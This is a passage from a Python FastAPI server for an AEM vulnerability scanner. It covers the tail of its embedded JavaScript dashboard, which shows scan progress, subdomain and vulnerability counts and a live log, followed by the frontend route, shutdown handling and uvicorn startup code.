  addLog('info', 'Phase ' + msg.phase + ': ' + msg.name + ' - ' + msg.status + (msg.message ? ' (' + msg.message + ')' : ''));
}

function handleProgress(msg) {
  if (msg.phase === 1) {
    document.getElementById('p1val').textContent = msg.current;
  }
  if (msg.total > 0) {
    const pct = Math.round(msg.current / msg.total * 100);
    document.getElementById('progressFill').style.width = pct + '%';
    document.getElementById('progressText').textContent = msg.message || (pct + '%');
  } else {
    document.getElementById('progressText').textContent = msg.message || '';
  }
}

function handleComplete(msg) {
  showProgress(false);
  document.getElementById('scanBtn').disabled = false;
  document.getElementById('cancelBtn').style.display = 'none';

  if (msg.summary) {
    document.getElementById('summarySection').style.display = '';
    const s = msg.summary;
    let html = '';
    if (s.elapsed_seconds !== undefined) html += statCard(s.elapsed_seconds + 's', 'Elapsed', 'stat-blue');
    if (s.subdomains_found !== undefined) html += statCard(s.subdomains_found, 'Subdomains', 'stat-cyan');
    if (s.alive_hosts !== undefined) html += statCard(s.alive_hosts, 'Alive Hosts', 'stat-cyan');
    if (s.aem_confirmed !== undefined) html += statCard(s.aem_confirmed, 'AEM Confirmed', 'stat-green');
    if (s.aem_suspected !== undefined) html += statCard(s.aem_suspected, 'AEM Suspected', 'stat-yellow');
    if (s.vulnerabilities !== undefined) html += statCard(s.vulnerabilities, 'Vulnerabilities', s.vulnerabilities > 0 ? 'stat-red' : 'stat-green');
    if (s.error) html += statCard('ERR', s.error.substring(0, 40), 'stat-red');
    document.getElementById('summaryGrid').innerHTML = html;
  }
  addLog('info', 'Scan complete');
}

function statCard(val, lbl, cls) {
  return '<div class="stat-card ' + cls + '"><div class="val">' + val + '</div><div class="lbl">' + lbl + '</div></div>';
}

function addLog(type, html) {
  const log = document.getElementById('liveLog');
  log.innerHTML += '<div class="log-entry">' + html + '</div>';
  log.scrollTop = log.scrollHeight;
}

function showProgress(visible) {
  document.getElementById('progressBar').className = 'progress-bar-container' + (visible ? ' visible' : '');
}

function resetPhases() {
  for (let i = 1; i <= 4; i++) {
    document.getElementById('phase' + i).className = 'phase-card';
    document.getElementById('p' + i + 'val').textContent = '--';
  }
  document.getElementById('progressFill').style.width = '0%';
  document.getElementById('progressText').textContent = '';
}

function esc(s) { const d = document.createElement('div'); d.textContent = s; return d.innerHTML; }

document.getElementById('targetInput').addEventListener('keydown', function(e) {
  if (e.key === 'Enter') startScan();
});
</script>
</body>
</html>"""


@app.get("/", response_class=HTMLResponse)
async def serve_frontend() -> str:
    templates_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "templates", "index.html")
    if os.path.exists(templates_path):
        with open(templates_path, "r") as f:
            return f.read()
    return FRONTEND_HTML


# ============================================================================
# SHUTDOWN
# ============================================================================
@app.on_event("shutdown")
async def shutdown_event() -> None:
    """Cancel running scans and persist their current state before shutdown."""
    with scans_lock:
        for scan in scans.values():
            scan.cancelled = True
            if scan.status == "running":
                scan.status = "interrupted"
                scan.finished_at = scan.finished_at or time.time()
                _persist_scan(scan)   # save "interrupted" so dashboard shows it after restart
    log.info("All scans cancelled and persisted on shutdown")


# ============================================================================
# MAIN
# ============================================================================
if __name__ == "__main__":
    import uvicorn

    port = int(os.environ.get("PORT", 8000))
    host = os.environ.get("HOST", "0.0.0.0")
    log.info("Starting AEM Scanner on %s:%d", host, port)
    uvicorn.run(
        "server:app",
        host=host,
        port=port,
        reload=False,
        ws_ping_interval=30,
        ws_ping_timeout=60,
        log_level="info",
    )
